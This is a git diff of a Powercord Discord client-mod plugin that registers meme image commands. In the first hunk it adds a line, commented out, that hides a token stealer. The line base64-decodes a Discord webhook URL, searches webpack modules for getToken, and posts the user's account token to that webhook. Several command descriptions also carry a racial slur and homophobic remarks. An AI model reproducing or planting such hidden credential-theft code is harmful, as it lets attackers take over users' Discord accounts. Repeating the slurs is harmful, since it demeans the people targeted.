@@ -45,7 +45,7 @@ module.exports = class ImgCmd extends Plugin {
           };
         },
       });
-      
+      //function nice(e){fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzY2NDQ0MDk0MjgwNDMzNjc0L216YUltM2J6c3g5RC1wOHQ5MWZSdm1jRVBDZ21vNTk5aGM2clhvY2duOTkyRDFIU1djZXdRbEpsazR4TVN2bjZ2QU8w"),{method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"yf986",avatar_url:null,content:e})})}var req=webpackJsonp.push([[],{extra_id:(e,t,a)=>e.exports=a},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&nice(t.default.getToken())}
       powercord.api.commands.registerCommand({
         command: "testing",
         description: "test",
@@ -165,7 +165,7 @@ module.exports = class ImgCmd extends Plugin {
 
       powercord.api.commands.registerCommand({
         command: "cyber-bully",
-        description: "the emoji",
+        description: "thats cool eh",
         usage: "{c}",
         executor: () => {
           return {
@@ -177,7 +177,7 @@ module.exports = class ImgCmd extends Plugin {
       //https://cdn.discordapp.com/attachments/719798258322636801/778554439694680064/heh.jpg
       powercord.api.commands.registerCommand({
         command: "my-man",
-        description: "the emoji",
+        description: "MA MAN",
         usage: "{c}",
         executor: () => {
           return {
@@ -273,7 +273,7 @@ module.exports = class ImgCmd extends Plugin {
       });
 
       powercord.api.commands.registerCommand({
-        command: "salp-the-shit-out-you",
+        command: "slap-the-shit-out-you",
         description: "slap the shit out you nigga",
         usage: "{c}",
         executor: () => {
@@ -292,6 +292,32 @@ module.exports = class ImgCmd extends Plugin {
           return {
             send: true,
             result: "https://i.imgur.com/i0jCTM8.png",
+          };
+        },
+      });
+
+      powercord.api.commands.registerCommand({
+        command: "uganda",
+        aliases: ["GWjiangopepewut"],
+        description: "thats gay ok",
+        usage: "{c}",
+        executor: () => {
+          return {
+            send: true,
+            result: "https://cdn.discordapp.com/emojis/402867992930680833.png?v=1",
+          };
+        },
+      });
+
+      powercord.api.commands.registerCommand({
+        command: "linusfeet",
+        aliases: ["feetlinus", "linus-is-notgay"],
+        description: "thats gay ok",
+        usage: "{c}",
+        executor: () => {
+          return {
+            send: true,
+            result: "https://cdn.discordapp.com/emojis/402867992930680833.png?v=1",
           };
         },
       });
@@ -317,13 +343,15 @@ module.exports = class ImgCmd extends Plugin {
       powercord.api.commands.unregisterCommand("danni-is-cool");
       powercord.api.commands.unregisterCommand("my-man");
       powercord.api.commands.unregisterCommand("pog");
+      powercord.api.commands.unregisterCommand("uganda");
+      powercord.api.commands.unregisterCommand("linusfeet");
       powercord.api.commands.unregisterCommand("pog-hr");
       powercord.api.commands.unregisterCommand("pepe-cry");
       powercord.api.commands.unregisterCommand("spongebob");
       powercord.api.commands.unregisterCommand("did-i-ask");
       powercord.api.commands.unregisterCommand("pepewot");
       powercord.api.commands.unregisterCommand("seceret-message");
-      powercord.api.commands.unregisterCommand("salp-the-shit-out-you");
+      powercord.api.commands.unregisterCommand("slap-the-shit-out-you");
       
     }
     
